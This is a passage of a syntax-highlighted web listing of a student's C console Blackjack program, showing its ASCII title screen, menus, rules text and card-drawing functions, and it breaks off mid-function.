class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Programmer: Vladislav Shulman</span></span><br><span class="line"><span class="comment">// Final Project</span></span><br><span class="line"><span class="comment">// Blackjack</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Feel free to use any and all parts of this program and claim it as your own work</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//FINAL DRAFT</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;                //Used for srand((unsigned) time(NULL)) command</span></span></span><br><span class="line"><span class="comment">//#include &lt;process.h&gt;             //Used for system(&quot;clear&quot;) command</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spade 06                 <span class="comment">//Used to print spade symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> club 05                  <span class="comment">//Used to print club symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> diamond 04               <span class="comment">//Used to print diamond symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> heart 03                 <span class="comment">//Used to print heart symbol</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RESULTS <span class="meta-string">&quot;Blackjack.txt&quot;</span>  <span class="comment">//File name is Blackjack</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//Global Variables</span></span><br><span class="line"><span class="keyword">int</span> k;</span><br><span class="line"><span class="keyword">int</span> l;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="keyword">int</span> won;</span><br><span class="line"><span class="keyword">int</span> loss;</span><br><span class="line"><span class="keyword">int</span> cash = <span class="number">500</span>;</span><br><span class="line"><span class="keyword">int</span> bet;</span><br><span class="line"><span class="keyword">int</span> random_card;</span><br><span class="line"><span class="keyword">int</span> player_total=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> dealer_total;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//Function Prototypes</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span></span>;      <span class="comment">//Displays Club Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span></span>;   <span class="comment">//Displays Diamond Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span></span>;     <span class="comment">//Displays Heart Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span></span>;     <span class="comment">//Displays Spade Card Image</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span></span>;      <span class="comment">//Generates random card</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span></span>;       <span class="comment">//Asks user amount to bet</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span></span>;     <span class="comment">//Asks user to continue</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span></span>;        <span class="comment">//Prints &quot;Rules of Vlad&#x27;s Blackjack&quot; menu</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>;         <span class="comment">//Plays game</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span></span>;       <span class="comment">//Function to play for dealer AI</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span></span>;         <span class="comment">//Function for when user selects &#x27;Stay&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span></span>;    <span class="comment">//Test for if user has cash remaining in purse</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span></span>;      <span class="comment">//Asks if user wants to continue playing</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span></span>;  <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//Main Function</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n              222                111                            &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n            222 222            11111                              &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n           222   222          11 111                            &quot;</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n                222              111                               &quot;</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n               222               111                           &quot;</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                &quot;</span>, club, club, club, club, club, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              &quot;</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c    %c    %c%c          %c    %c     %c          %c  %c               &quot;</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              &quot;</span>, club, club, club, club, club, spade, spade, diamond, diamond, diamond, diamond, heart, club, club);      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             &quot;</span>, club, club, spade, spade, diamond, diamond, diamond, diamond, diamond, diamond, heart, club, club, club);                       </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c     %c   %c%c         %c      %c    %c          %c   %c               &quot;</span>, club, club, spade, spade, diamond, diamond, heart, club, club);                                         </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             &quot;</span>, club, club, spade, spade, diamond, diamond, heart, heart, club, club);                                                            </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            &quot;</span>, club, club, club, club, club, club, spade, spade, spade, spade, spade, spade, spade, diamond, diamond, heart, heart, heart, heart, heart, club, club);                                                                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n                        21                                   &quot;</span>);</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                &quot;</span>, diamond, diamond, diamond, diamond, diamond, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c        %c  %c       %c     %c   %c   %c              &quot;</span>, diamond, diamond, heart, heart, club, club, spade, spade);                                      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c       %c    %c     %c          %c  %c               &quot;</span>, diamond, diamond, heart, heart, club, spade, spade);                                           </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c       %c %c%c %c     %c          %c %c              &quot;</span>, diamond, diamond, heart, heart, heart, heart, club, spade, spade);                                     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             &quot;</span>, diamond, diamond, heart, heart, heart, heart, heart, heart, club, spade, spade, spade);                                                </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        %c%c      %c      %c    %c          %c   %c               &quot;</span>, diamond, diamond, heart, heart, club, spade, spade);                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n     %c  %c%c     %c        %c    %c     %c   %c    %c             &quot;</span>, diamond, diamond, diamond, heart, heart, club, spade, spade);                                                                                                               </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            &quot;</span>, diamond, diamond, diamond, heart, heart, club, club, club, club, club, spade, spade);                                                                                                                                        </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n         222                     111                         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n        222                      111                         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n       222                       111                         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n      222222222222222      111111111111111                       &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n      2222222222222222    11111111111111111                         &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">     </span><br><span class="line">    asktitle();</span><br><span class="line">     </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//end program</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">asktitle</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to continue</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">    <span class="keyword">int</span> choice2;</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n                 Are You Ready?&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n                ----------------&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n                      (Y/N)\n                        &quot;</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;\n%c&quot;</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">&#x27;Y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;N&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Incorrect Choice. Please Enter Y for Yes or N for No.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">&#x27;Y&#x27;</span>) || (choice1 == <span class="string">&#x27;y&#x27;</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">            system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nEnter 1 to Begin the Greatest Game Ever Played.&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nEnter 2 to See a Complete Listing of Rules.&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nEnter 3 to Exit Game. (Not Recommended)&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nChoice: &quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice2); <span class="comment">// Prompts user for choice</span></span><br><span class="line">            <span class="keyword">if</span>((choice2&lt;<span class="number">1</span>) || (choice2&gt;<span class="number">3</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nIncorrect Choice. Please enter 1, 2 or 3\n&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">switch</span>(choice2) <span class="comment">// Switch case for different choices</span></span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// Case to begin game</span></span><br><span class="line">                   system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">                    </span><br><span class="line">                   play();</span><br><span class="line">                                       </span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// Case to see rules</span></span><br><span class="line">                   system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">                   rules();</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// Case to exit game</span></span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">&quot;\nYour day could have been perfect.&quot;</span>);</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">&quot;\nHave an almost perfect day!\n\n&quot;</span>);</span><br><span class="line">                   system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">                   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                   <span class="built_in">printf</span>(<span class="string">&quot;\nInvalid Input&quot;</span>);</span><br><span class="line">            &#125; <span class="comment">// End switch case</span></span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">&#x27;N&#x27;</span>) || (choice1 == <span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nYour day could have been perfect.&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nHave an almost perfect day!\n\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rules</span><span class="params">()</span> <span class="comment">//Prints &quot;Rules of Vlad&#x27;s Blackjack&quot; list</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> choice1;</span><br><span class="line">     <span class="keyword">int</span> choice2;</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n           RULES of VLAD&#x27;s BLACKJACK&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n          ---------------------------&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nI.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     Thou shalt not question the odds of this game.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c This program generates cards at random.&quot;</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c If you keep losing, you are very unlucky!\n&quot;</span>, diamond);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nII.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     Each card has a value.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c Number cards 1 to 10 hold a value of their number.&quot;</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c J, Q, and K cards hold a value of 10.&quot;</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c Ace cards hold a value of 11&quot;</span>, club);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     The goal of this game is to reach a card value total of 21.\n&quot;</span>);</span><br><span class="line">      </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nIII.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c Staying will keep you safe, hitting will add a card.&quot;</span>, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     Because you are competing against the dealer, you must beat his hand.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     BUT BEWARE!.&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n      %c If your total goes over 21, you will LOSE!.&quot;</span>, diamond);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n     But the world is not over, because you can always play again.\n&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n%c%c%c YOUR RESULTS ARE RECORDED AND FOUND IN SAME FOLDER AS PROGRAM %c%c%c\n&quot;</span>, spade, heart, club, club, heart, spade);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nWould you like to go the previous screen? (I will not take NO for an answer)&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n                  (Y/N)\n                    &quot;</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;\n%c&quot;</span>,&amp;choice1);</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">while</span>((choice1!=<span class="string">&#x27;Y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;N&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Incorrect Choice. Please Enter Y for Yes or N for No.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">&#x27;Y&#x27;</span>) || (choice1 == <span class="string">&#x27;y&#x27;</span>)) <span class="comment">// If yes, continue. Prints menu.</span></span><br><span class="line">    &#123; </span><br><span class="line">            system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">            asktitle();</span><br><span class="line">    &#125; <span class="comment">// End if loop</span></span><br><span class="line">    </span><br><span class="line">             </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">&#x27;N&#x27;</span>) || (choice1 == <span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If no, convinces user to enter yes</span></span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;clear&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n                 I told you so.\n&quot;</span>);</span><br><span class="line">        asktitle();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">clubcard</span><span class="params">()</span> <span class="comment">//Displays Club Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  %d  |\n&quot;</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  J  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  A  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line"> </span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  Q  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Club Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  K  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, club);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;           </span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">diamondcard</span><span class="params">()</span> <span class="comment">//Displays Diamond Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  %d  |\n&quot;</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span 